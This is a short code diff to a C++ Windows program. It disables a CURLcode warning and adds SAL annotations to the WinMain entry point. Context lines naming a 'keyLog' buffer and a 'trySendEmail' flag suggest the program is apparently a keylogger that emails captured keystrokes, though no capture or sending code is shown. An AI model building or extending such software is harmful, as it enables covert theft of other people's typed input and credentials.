@@ -5,6 +5,8 @@
 #pragma comment(lib, "wldap32.lib")
 #pragma comment(lib, "Crypt32.lib")
 
+#pragma warning(disable : 26812) //The enum type 'CURLcode' is unscoped. Prefer 'enum class' over 'enum'
+
 #include <string>
 #include <fstream>
 #include <sstream>
@@ -68,7 +70,7 @@ string bytesToHex(unsigned char* data, int length);
 void createDirectoryRecursively(tstring path);
 
 //Main
-int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
+int APIENTRY _tWinMain(_In_ HINSTANCE This, _In_opt_ HINSTANCE prev, _In_ LPWSTR cmd, _In_ int mode)
 {
 	keyLog.reserve(256);
 	if(trySendEmail)
